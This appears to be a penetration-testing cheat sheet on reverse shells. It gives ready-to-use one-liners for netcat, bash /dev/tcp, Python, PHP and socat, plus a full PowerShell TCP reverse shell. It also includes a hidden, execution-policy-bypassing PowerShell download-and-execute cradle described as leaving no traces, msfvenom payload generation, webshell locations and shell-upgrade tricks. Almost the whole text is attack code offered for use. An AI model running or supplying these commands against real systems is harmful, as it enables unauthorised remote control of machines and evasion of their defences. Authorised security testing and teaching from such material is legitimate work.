# All about reverse shells

* Try always using ports: 80 or 443 if open

# Reverse shells

All of those methods assume that necessary programs like nc, python, php and etc are installed on target hosts.

* Firewall allow mostly outbound connections, that's why rever shell is so popular.
* You always need a listener to connect a rev shell to
`nc -lvnp <PORT>`
* by <PORT> selection try using ports 80, 443 because they are mostly not blocked by firewalls

## Netcat

* Necat: 
```
# Linux
nc <IP> <PORT> -e /bin/bash

# Windows
nc.exe <IP> <PORT> -e cmd.exe

```

## Bash

`bash -i >& /dev/tcp/ATTACKER-IP/ATTACKER-PORT 0>&1`

## Powershell

This script is tested on most windows machines and should work fine.

```
#replace <IP_VICTIM> with target ip, so it is going to look something like this: TCPClient('10.231.12.44',443)

$client = New-Object System.Net.Sockets.TCPClient('<IP_VICTIM>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
launch on target
```

Launch the above script directly or save on local attacking maching and call it from powershell like that to execute in memory and leave no traces

`powershell.exe -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/raw.ps1')"`

## Python

* Python3: 

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",ATTACKER-PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

## PHP

```
php -r '$sock=fsockopen("ATTACKER-IP",ATTACKER-PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
```

## Socat

* Socat is not well know but is super useful if able to launch
* Once launche socat can provide a fully interactive shell just like SSH

Here is bind shell example:

```
#On Victim with IP address 10.99.66.88 initiate a listener:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP4-LISTEN:3333,reuseaddr,fork,ignoreeof

#from attacker
socat file:`tty`,raw,echo=0 tcp:10.99.66.88:3333
```

## Webshell

In Kali it is integrated:

`$ webshells`

After that you shall be placed into the directory with webshells

```
> webshells ~ Collection of webshells
/usr/share/webshells
├── asp
├── aspx
├── cfm
├── jsp
├── laudanum -> /usr/share/laudanum
├── perl
└── php

```

Here you have a rich selection of all possible shells.

## Reverse Shell bytecode generation with MSFVENOM

Use for any available payload.

`msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.xxx.xxx LPORT=443 -f python`

`msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888`

# Shell Upgrade

* The bind/reverse shell is not always fully interactive
* Python trick can be used to make it such

<code> python -c 'import pty; pty.spawn("/bin/bash")' </code><br>
<code> python3 -c 'import pty;pty.spawn("/bin/bash")' </code>

* Using script
'script /dev/null -c bash'
